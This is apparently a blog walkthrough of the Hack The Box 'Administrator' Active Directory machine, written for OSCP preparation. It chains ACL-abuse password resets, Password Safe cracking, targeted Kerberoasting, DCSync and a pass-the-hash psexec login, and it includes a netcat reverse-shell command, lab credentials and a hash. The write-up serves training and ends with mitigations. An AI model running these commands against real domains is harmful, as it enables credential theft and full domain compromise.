---
title: Administrator
date: 2025-06-03
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, AD, GenericAll, ForceChangePassword, ACL-Abuse, Password-Safe, .psafe3, pwsafe2john, GenericWrite, TargetedKerberoasting, DCSync] 
image: admin.png
media_subpath: /assets/img/posts/2025-06-03-administratorHTB/
---

## Introduction

On the medium-difficulty Windows domain machine **Administrator**, I started with low-privileged user credentials. Enumerating ACLs revealed that `olivia` had `GenericAll` permissions on `michael`, so I reset his password and accessed his account. Similarly, `michael` could reset `benjamin`'s password, which led me to an FTP share containing a `backup.psafe3` file. Cracking it yielded multiple credentials, and I discovered `emily`’s valid credentials via password spraying. Emily had `GenericWrite` rights over `ethan`, which I used to perform a **Kerberoasting** attack. Cracking Ethan’s TGS hash gave me his password, and since Ethan had **DCSync** rights, I dumped the NTDS hashes, achieving full domain compromise.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

![image.png](image%202.png)

## Services

### Port 53 (DNS)

Version: 

Domain: 

- **dig any DNS records**
    
    ```bash
    dig any administrator.htb @$IP
    ```
    
    ![image.png](image%203.png)
    
- **Zone Transfer**
    
    ```bash
    dig axfr @$IP <domain>
    ```
    
    ![image.png](image%204.png)
    

### Port 21 (FTP)

User Olivia cannot login to `FTP`, and anonymous access is blocked.

### Port 139/445 (SMB)

Checking for shares I don’t see outstanding shares:

```powershell
sudo nxc smb $IP -u olivia -p 'ichliebedich'  --shares
```

![image.png](image%205.png)

### Port 5985 (WinRM)

## Web

## AD Initial Enumeration

### User Enumeration

Authenticated

```bash
lookupsid.py administrator.htb/olivia:'ichliebedich'@administrator.htb | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users
```

![image.png](image%206.png)

### Port 389/3268

```bash
ldapsearch -H ldap://$IP -x -s base -b '' "(objectClass=*)" "*" +
```

```powershell
ldapsearch -x -H ldap://$IP -D '' -w '' -b "DC=<RHOST>,DC=local" 
```

### Digging to SYSVOL Share

Digging SYSVOL share I don’t se `Registry.xml` file

```powershell
sudo nxc smb $IP -u olivia -p 'ichliebedich' -M spider_plus --share 'SYSVOL'
```

![image.png](image%207.png)

## Initial Attack Vectors

### AS-REP Roasting

```bash
impacket-GetNPUsers -dc-ip $IP administrator.htb/olivia
```

![image.png](image%208.png)

### Password Spraying

- [x]  make a userlist (obtain a userlist)
- [x]  use same passwords as usernames, reverse of them make up passwords of the seasons and current year

```powershell
sudo nxc smb $IP -u users -p 'ichliebedich' --continue-on-success
```

![image.png](image%209.png)

## Post-Compromise Enumeration

### BloodHound

```powershell
.\SharpHound.exe -c All --zipfilename adminisrtator-AD
sudo neo4j start 
bloodhound
```

## Post-Compromise Attacks

### Kerberoasting

```powershell
GetUserSPNs.py -dc-ip $IP administrator.htb/olivia
```

![image.png](image%2010.png)

### ACL-Abuse

After running BloodHound and checking my privileges I see that my user has `GenericAll` privileges over account `michael`.

![image.png](image%2011.png)

```powershell
net rpc password "michael" "newP@ssword2022" -U "administrator.htb"/"olivia"%"ichliebedich" -S $IP
```

I changed password of `michael` user.

```powershell
sudo nxc smb $IP -u michael -p 'newP@ssword2022' --shares
```

![image.png](image%2012.png)

## Shell as Michael

```powershell
evil-winrm -i $IP -u Michael -p 'newP@ssword2022'
```

![image.png](image%2013.png)

Checking Michael Privileges I see that he has `ForceChangePassword` over Benjamin.

![image.png](image%2014.png)

```powershell
net rpc password "Benjamin" "newP@ssword2023" -U "administrator.htb"/"michael"%"newP@ssword2022" -S $IP
```

```powershell
sudo nxc smb $IP -u benjamin -p 'newP@ssword2023' --shares
```

![image.png](image%2015.png)

## Shell as Benjamin

Let’s run `Invoke-RunasCs.ps1` to get a shell as Benjamin, because Benjamin is not in `Remote Management Users` or `Remote Desktop Users` group.

```powershell
Invoke-RunasCs -Username benjamin -Password 'newP@ssword2023' -Command "C:\tools\nc64.exe -e cmd.exe 10.10.14.19 4444"
```

But we are not allowed to do that.

I remember we had FTP share, and we are in Share Operators group, I connected to FTP using benjamin user and get a file called `Backup.psafe3` this is Password Safe V3 Database, encrypted database that stores credentials, I am gonna extract hash from this file and try to crack it using john.

```bash
pwsafe2john Backup.psafe3 > backup.hash
```

```bash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Cracked master key - `tekieromucho`

To open Password Safe file I am gonna use `pwsafe` software:

```bash
sudo apt update
sudo apt install passwordsafe
```

![image.png](image%2016.png)

Click `Password` field on the right upper side, and it will copy the password to clipboard.

## Shell as Emily

```bash
evil-winrm -i $IP -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb’
```

I see that user `emily` has `GenericWrite` privileges over `ethan`.

We can perform Targeted Kerberoasting attack against `ethan` user, but I am not sure whether it will be successfull because password can be complex, nevertheless I will try.

```bash
Set-DomainObject  -Identity ethan -SET @{serviceprincipalname='nonexistent/ADMINISTRATOR'}
```

```bash
GetUserSPNs.py -dc-ip $IP administrator.htb/emily -request
```

![image.png](image%2017.png)

I was able to crack the hash:

```bash
hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt
```

![image.png](image%2018.png)

## DCSync as ethan

Now that we have credentials as ethan I can perform DCSync attack as of information received from BloodHound.

![image.png](image%2019.png)

```bash
secretsdump.py -just-dc administrator.htb/ethan@$IP
```

![image.png](image%2020.png)

## Shell as NT Authority System

```bash
impacket-psexec Administrator@$IP -hashes :3dc553ce4b9fd20bd016e098d2d2fd2e
```

![image.png](image%2021.png)

## Credentials

```powershell
Olivia : ichliebedich
Michael : newP@ssword2022
Benjamin : newP@ssword2023
emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma : WwANQWnmJnGV07WQN8bMS7FMAbjNur
ethan : limpbizkit
```

## Mitigation

- Avoid assigning **GenericAll** and **GenericWrite** permissions on user objects.
- Regularly audit **Active Directory ACLs** and prune over-permissive rights.
- Monitor for **password spray** and **Kerberoasting** activity using SIEM tools.
- Encrypt sensitive backup files with strong, unique passwords.
- Restrict **DCSync rights** only to essential accounts like Domain Admins.
